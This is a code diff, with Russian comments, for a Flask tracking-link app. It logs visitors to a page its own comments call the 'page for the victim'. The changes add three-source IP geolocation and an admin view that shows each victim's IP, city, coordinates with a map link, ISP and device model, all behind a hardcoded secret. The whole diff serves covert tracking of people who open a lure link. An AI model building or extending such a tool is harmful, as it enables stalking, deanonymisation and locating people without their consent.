@@ -7,7 +7,7 @@ UPLOAD_FOLDER = 'static/uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 DB = 'db.sqlite'
 
-# ========== СЕКРЕТНЫЙ КЛЮЧ ==========
+# ========== СЕКРЕТНЫЙ КЛЮЧ (измените при необходимости) ==========
 ADMIN_SECRET = "18iwixjwi199woxk"
 
 def init_db():
@@ -23,7 +23,6 @@ def init_db():
     conn.close()
 init_db()
 
-# ========== СТИЛИ (без изменений) ==========
 STYLES = """
 <style>
     body { font-family: 'Segoe UI', Tahoma, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f7fa; }
@@ -70,60 +69,62 @@ STYLES = """
 </style>
 """
 
-# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
-def get_real_ip():
-    if request.headers.get('X-Forwarded-For'):
-        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
-    if request.headers.get('X-Real-IP'):
-        return request.headers.get('X-Real-IP')
-    return request.remote_addr
-
+# ========== ФУНКЦИЯ ГЕОЛОКАЦИИ (3 ИСТОЧНИКА) ==========
 def get_geo_info(ip):
-    """Город из ip-api.com, координаты и оператор из ipapi.co (если доступен)"""
+    """Определение города из трёх источников: ip-api.com, ipapi.co, geojs.io"""
     result = {
-        'city': '',
+        'city_ipapi': '',
+        'city_ipapico': '',
+        'city_geojs': '',
         'country': '',
-        'region': '',
         'loc': '',
         'org': '',
         'timezone': '',
-        'source': 'ip-api.com'
+        'source': 'multiple'
     }
-    # Базовые данные через ip-api.com (город, страна)
+    # 1. ip-api.com
     try:
         resp = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,regionName,timezone', timeout=3)
         if resp.status_code == 200:
             data = resp.json()
             if data.get('status') == 'success':
-                result['city'] = data.get('city', '')
+                result['city_ipapi'] = data.get('city', '')
                 result['country'] = data.get('country', '')
-                result['region'] = data.get('regionName', '')
                 result['timezone'] = data.get('timezone', '')
     except:
         pass
 
-    # Дополнительные данные (координаты, оператор) через ipapi.co
+    # 2. ipapi.co
     try:
         resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
         if resp.status_code == 200:
             data = resp.json()
             if 'error' not in data:
+                result['city_ipapico'] = data.get('city', '')
                 lat = data.get('latitude')
                 lon = data.get('longitude')
                 if lat and lon:
                     result['loc'] = f"{lat},{lon}"
                 if data.get('org'):
                     result['org'] = data['org']
-                if not result['city'] and data.get('city'):
-                    result['city'] = data['city']
                 if not result['country'] and data.get('country_name'):
                     result['country'] = data['country_name']
-                result['source'] += ' + ipapi.co'
     except:
         pass
+
+    # 3. geojs.io
+    try:
+        resp = requests.get(f'https://get.geojs.io/v1/ip/geo/{ip}.json', timeout=3)
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'city' in data:
+                result['city_geojs'] = data.get('city', '')
+    except:
+        pass
+
     return result
 
-# ========== БАЗА DPI ==========
+# ========== БАЗА DPI ДЛЯ ОПРЕДЕЛЕНИЯ МОДЕЛИ ==========
 DEVICE_DB = {
     (1170, 2532, 3.0): ('Apple', 'iPhone 14 Pro / 15 Pro'),
     (1179, 2556, 3.0): ('Apple', 'iPhone 15 Pro Max'),
@@ -165,6 +166,14 @@ def guess_device_by_screen(screen_str, dpr):
     except:
         pass
     return None, None
+
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
+def get_real_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    if request.headers.get('X-Real-IP'):
+        return request.headers.get('X-Real-IP')
+    return request.remote_addr
 
 # ========== ДЕКОРАТОР ДЛЯ ПРОВЕРКИ СЕКРЕТА ==========
 def require_secret(f):
@@ -301,7 +310,7 @@ def upload(secret):
     </html>
     ''', link=link, uid=uid, original_name=original_name, mime_type=mime_type, secret=secret, STYLES=STYLES)
 
-# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ ==========
+# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ (без секрета) ==========
 TRACK_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -483,9 +492,8 @@ def collect():
     ip = get_real_ip()
     ua = request.headers.get('User-Agent', '')
     
-    # Геолокация
+    # Геолокация из трёх источников
     geo = get_geo_info(ip)
-    city = geo.get('city', '')
     
     # Парсинг User-Agent
     parsed_ua = parse(ua)
@@ -522,13 +530,16 @@ def collect():
     if not device_brand:
         device_brand = 'Неизвестно'
     
-    operator = geo.get('org', '')
-    
+    # Добавляем данные в fingerprint
     data['os_version'] = os_version
     data['device_model'] = device_model
     data['device_brand'] = device_brand
-    data['operator'] = operator
+    data['operator'] = geo.get('org', '')
     data['geo'] = geo
+    
+    # Сохраняем город как первый из доступных (для поля city в таблице)
+    city = geo.get('city_ipapi') or geo.get('city_ipapico') or geo.get('city_geojs') or ''
+    
     fingerprint = json.dumps(data)
     conn = sqlite3.connect(DB)
     conn.execute("INSERT INTO logs (uid, ip, ua, city, fingerprint, time) VALUES (?,?,?,?,?,?)",
@@ -537,7 +548,7 @@ def collect():
     conn.close()
     return jsonify({"status": "ok"})
 
-# ========== СТРАНИЦА ЛОГОВ ==========
+# ========== СТРАНИЦА ЛОГОВ (админка) ==========
 @app.route('/admin/<secret>/logs')
 @require_secret
 def admin_logs(secret):
@@ -611,22 +622,31 @@ def admin_logs_detail(secret, num):
     else:
         for ip, ua, city, fp, t in logs:
             html += f"<div class='log-entry'><span class='time'>{time.ctime(t)}</span><br>IP: {ip}<br>"
-            # Город из базы (если есть)
-            city_display = city if city else 'Неизвестно'
-            html += f"<b>Город:</b> {city_display}<br>"
             if fp:
                 try:
                     fp_data = json.loads(fp)
                     geo = fp_data.get('geo', {})
-                    # Координаты и оператор (из geo)
+                    # Вывод трёх городов
+                    city1 = geo.get('city_ipapi', '') or 'Неизвестно'
+                    city2 = geo.get('city_ipapico', '') or 'Неизвестно'
+                    city3 = geo.get('city_geojs', '') or 'Неизвестно'
+                    html += f"<b>Город (ip-api.com):</b> {city1}<br>"
+                    html += f"<b>Город (ipapi.co):</b> {city2}<br>"
+                    html += f"<b>Город (geojs.io):</b> {city3}<br>"
+                    # Координаты и оператор
                     loc = geo.get('loc')
-                    if loc:
-                        maps_link = f"https://www.google.com/maps?q={loc}"
-                        html += f"<b>Координаты:</b> {loc} <a href='{maps_link}' target='_blank'>(карта)</a><br>"
                     org = geo.get('org')
-                    if org:
-                        html += f"<b>Оператор/провайдер:</b> {org}<br>"
-                    # Остальные поля
+                    if loc or org:
+                        html += "<div class='geo-info'><b>🌍 Дополнительная геолокация:</b><br>"
+                        if loc:
+                            maps_link = f"https://www.google.com/maps?q={loc}"
+                            html += f"<b>Координаты:</b> {loc} <a href='{maps_link}' target='_blank'>(открыть на карте)</a><br>"
+                        if org:
+                            html += f"<b>Оператор/провайдер:</b> {org}<br>"
+                        html += "</div>"
+                    else:
+                        html += "<div class='geo-info'><b>🌍 Дополнительная геолокация:</b> недоступна<br></div>"
+                    # Остальные данные
                     html += f"<b>Версия ОС:</b> {fp_data.get('os_version', 'неизвестно')}<br>"
                     html += f"<b>Модель устройства:</b> {fp_data.get('device_model', 'неизвестно')}<br>"
                     html += f"<b>Бренд:</b> {fp_data.get('device_brand', 'неизвестно')}<br>"
